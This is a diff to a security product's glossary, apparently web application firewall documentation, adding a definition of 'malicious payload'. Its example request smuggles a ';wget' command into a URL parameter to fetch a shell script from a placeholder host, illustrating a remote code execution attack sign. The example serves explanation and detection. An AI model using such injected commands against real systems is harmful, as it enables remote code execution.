@@ -18,8 +18,29 @@ An example of an attack including many hits:
 
 ![!Attack with several hits](images/glossary/attack-with-several-hits-example.png)
 
-## Attack Vector
-An attack vector is a path or means by which a hacker can gain access to a network resource to deliver a payload.
+## Malicious Payload
+
+A part of an original request containing the following elements:
+
+* Attack signs detected in a request. If several attack signs characterizing the same attack type are detected in a request, only the first sign will be recorded to a payload.
+* Context of the attack sign. Context is a set of symbols preceding and closing detected attack signs. Since a payload length is limited, the context can be omitted if an attack sign is of full payload length.
+
+For example:
+
+* Request:
+
+    ```bash
+    curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
+    ```
+* Malicious payload:
+
+    ```bash
+    ;wget+http://s
+    ```
+
+    In this payload, `;wget+` is the [RCE](attacks-vulns-list.md#remote-code-execution-rce) attack sign and another part of the payload is the attack sign context.
+
+Since attack signs are not used to detect [behavioral attacks](about-wallarm-waf/protecting-against-attacks.md#behavioral-attacks), requests sent as a part of behavioral attacks have empty payloads.
 
 ## Vulnerability
 A vulnerability is an error made due to negligence or inadequate information when building or implementing a web application that can lead to an information security risk.
